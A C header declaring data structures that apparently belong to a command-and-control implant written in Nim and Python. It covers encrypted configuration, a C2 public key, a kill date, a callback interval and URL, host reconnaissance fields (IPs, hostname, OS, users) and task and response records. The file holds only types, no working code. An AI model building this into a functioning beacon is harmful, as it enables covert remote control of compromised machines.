/**
 * C data structures matching Nim/Python types for binary compatibility
 */

#ifndef TYPES_H
#define TYPES_H

#include <stdint.h>
#include <stdbool.h>

#define KEY_SIZE 32
#define NONCE_SIZE 24
#define MAC_SIZE 16

// Fixed-size types matching Nim's types
typedef struct {
    uint8_t data[KEY_SIZE];
} Key;

typedef struct {
    uint8_t data[NONCE_SIZE];
} Nonce;

typedef struct {
    uint8_t data[MAC_SIZE];
} Mac;

// EncObj - encryption object
typedef struct {
    Key publicKey;
    Nonce nonce;
    Mac mac;
    int64_t cipherLen;
    uint8_t* cipherText;
} EncObj;

// EncConfig - encrypted configuration (ref object in Nim)
typedef struct {
    Key privKey;
    Key pubKey;
    EncObj encObj;
} EncConfig;

// StaticConfig - static configuration (ref object in Nim)
typedef struct {
    char* buildID;
    char* deploymentID;
    Key c2PubKey;
    int32_t killEpoch;
    int32_t interval;
    char* callback;
} StaticConfig;

// Status - system status
typedef struct {
    char* ip;
    char* externalIP;
    char* hostname;
    char* os;
    char* arch;
    char* users;
    int64_t bootTime;
} Status;

// Callback - callback object (ref object in Nim)
typedef struct {
    StaticConfig* config;
    Status* status;
} Callback;

// Task - task object
typedef struct {
    char* taskId;
    int64_t taskNum;
    bool retrieved;
    bool complete;
    char* arg;
    char* resp;
} Task;

// Resp - response object
typedef struct {
    char* taskId;
    char* resp;
} Resp;

// Helper functions for memory management
void free_enc_obj(EncObj* obj);
void free_enc_config(EncConfig* config);
void free_static_config(StaticConfig* config);
void free_status(Status* status);
void free_callback(Callback* callback);
void free_task(Task* task);
void free_resp(Resp* resp);

#endif // TYPES_H
